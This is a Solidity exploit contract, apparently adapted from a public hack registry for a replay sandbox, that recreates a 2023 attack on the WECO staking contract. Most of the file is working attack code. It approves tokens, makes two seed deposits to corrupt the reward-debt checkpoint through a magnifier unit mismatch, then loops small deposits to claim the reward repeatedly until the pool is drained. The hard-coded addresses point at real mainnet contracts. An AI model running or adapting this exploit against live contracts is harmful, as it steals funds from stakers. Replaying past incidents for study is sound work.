// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Cheatcode-free synthetic exploit for the EVM Playground's replay engine
// (@ethereumjs/vm — no Foundry cheatcodes available). Faithfully mirrors
// evm-hack-registry/2023-11-WECO_exp/test/WECO_exp.sol's `testExploit()`,
// which the original Foundry test runs INLINE on the test contract itself
// (address(this) IS the attacker) using only the `deal()` cheatcode to seed
// its starting WECOIN balance.
//
// The `deal()` call is replaced by a `dealToken` pre-attack setup step in
// 2023-11-WECO.mjs (seeds this deployed contract with 25,000,001 WECOIN
// before `run()` is recorded). Everything else — approve, the two seed
// deposits, and the drain loop exploiting WECOStaking's reward-debt unit
// mismatch (offsetPoints stored un-magnified by _claimAndLock but
// re-magnified-down by MAGNIFIER=1e20 on every deposit) — is unchanged.

interface IWECOStaking {
    function deposit(uint256 _amount, uint256 _weeksLocked) external;
}

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract WECOExploit {
    IWECOStaking private constant WECOStaking = IWECOStaking(0xd672b766D66662F5C6fd798a999e1193a7945451);
    IERC20Min private constant WECOIN = IERC20Min(0x5d37ABAFd5498B0E7af753a2E83bd4F0335AA89F);

    function run() external {
        // WECOIN balance was seeded to 25,000,001 WECOIN by the setup.steps
        // `dealToken` step (mirrors the original test's `deal(...)` call).
        WECOIN.approve(address(WECOStaking), type(uint256).max);

        // Seed deposit #1: stake all but 1 WECOIN.
        WECOStaking.deposit(WECOIN.balanceOf(address(this)) - 1 ether, 0);
        uint256 balBeforeSecondDeposit = WECOIN.balanceOf(address(this));

        // Seed deposit #2: stake the remaining 1 WECOIN. `_claimAndLock` (called
        // first inside deposit()) pays out the reward the first deposit accrued
        // and stores `offsetPoints` UN-magnified; `deposit()` then immediately
        // overwrites `offsetPoints` with a value divided by MAGNIFIER (1e20) —
        // leaving the reward-debt checkpoint ~1e20x too small.
        WECOStaking.deposit(WECOIN.balanceOf(address(this)), 0);
        uint256 balAfterSecondDeposit = WECOIN.balanceOf(address(this));

        uint256 rewardPerDeposit = balAfterSecondDeposit - balBeforeSecondDeposit;
        uint256 stakingPoolBalance = WECOIN.balanceOf(address(WECOStaking));

        // Drain loop: because the stored reward-debt is now near-zero, every
        // subsequent `deposit(1 ether, 0)` re-triggers `_claimAndLock` and pays
        // out (almost) the FULL accumulated reward again, for the cost of just
        // 1 WECOIN staked. Repeat until the staking contract's reward pool
        // (its own WECOIN balance) is exhausted.
        uint256 i;
        while (i < stakingPoolBalance / rewardPerDeposit) {
            (bool success,) = address(WECOStaking).call(abi.encodeCall(WECOStaking.deposit, (1 ether, 0)));
            if (!success) {
                break;
            }
            ++i;
        }
    }
}
